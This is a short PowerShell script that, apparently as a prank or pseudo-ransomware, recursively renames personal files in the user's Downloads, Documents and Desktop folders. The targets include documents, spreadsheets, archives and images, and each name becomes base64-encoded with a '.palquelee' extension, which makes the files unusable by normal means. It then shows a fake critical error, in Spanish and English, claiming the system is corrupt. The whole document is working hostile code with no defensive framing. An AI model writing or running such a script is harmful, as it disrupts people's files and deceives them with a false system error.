$ext = @(".doc", ".docx", ".xls", ".xlsx", ".csv", ".ppt", ".pptx", ".msg", ".eml", ".pdf", ".txt", ".bat", ".com", ".zip", ".rar", ".7z", ".jpg", ".jpeg", ".png", ".gif");
Get-ChildItem -Path (Get-ChildItem -Path Env:\USERPROFILE).value | ForEach-Object {
    if($_.Name -eq "Downloads" -or $_.Name -eq "Dekstop" -or $_.Name -eq "Documents"){
        Get-ChildItem -Recurse -Path $_.FullName | ForEach-Object {
            if($ext.Contains($_.Extension.ToLower() )){
                try{
                    Rename-Item -Path $_.FullName -NewName ($_.DirectoryName + "\" + ([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($_.Name)) -replace "=","") +".palquelee");
                }catch{}
            }
        }
    }
};
Add-Type -AssemblyName Microsoft.VisualBasic;[Microsoft.VisualBasic.Interaction]::MsgBox("Ocurrió un error, el sistema esta corrupto.`nThere is an error the system is corrupt.",'OKOnly,SystemModal,Critical', 'ERROR') *> $null;